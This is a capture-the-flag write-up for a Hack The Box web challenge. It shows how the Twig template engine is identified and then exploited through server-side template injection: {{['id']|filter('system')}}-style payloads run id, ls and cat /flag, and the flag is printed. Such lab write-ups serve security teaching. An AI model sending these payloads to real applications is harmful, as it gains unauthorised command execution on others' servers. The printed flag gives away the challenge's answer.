# Baby Bonecherwercon

## Description

The devil is enticing us to commit some sandboxed SSTI feng shui, would you be interested in doing so?
http://docker.hackthebox.eu:31115/

## Writeup

![preview](img/1.png)

Upon opening the challenge link, we can see there is a form where we register a name.
This was by far the easiest web challenge.

Because of the description, we know it's an SSTI, So let's directy try to inject `{{7*'7'}}`

![49](img/2.png)

It resulted in `49`, So it's using `Twig` template. if the output was: `7777777` it'd be `Jinga2`.
You can refer to the diagram below to detect which template is used based on the input:

![diagram](img/diagram.png)

The exploitation part is quite easy, there is no filter at all, so we can just go ahead and use system function like this:

```
http://docker.hackthebox.eu:31115/?name={{["id"]|filter("system")}}
```

![id command](img/3.png)

Let's look for the flag

```
http://docker.hackthebox.eu:31115/?name={{["ls -la /"]|filter("system")}}
```

![ls command](img/4.png)


```
http://docker.hackthebox.eu:31115/?name={{["cat /flag"]|filter("system")}}
```

![cat flag](img/5.png)

#### Flag:

```
HTB{b3nt_tw1g_t0_my_will!}
```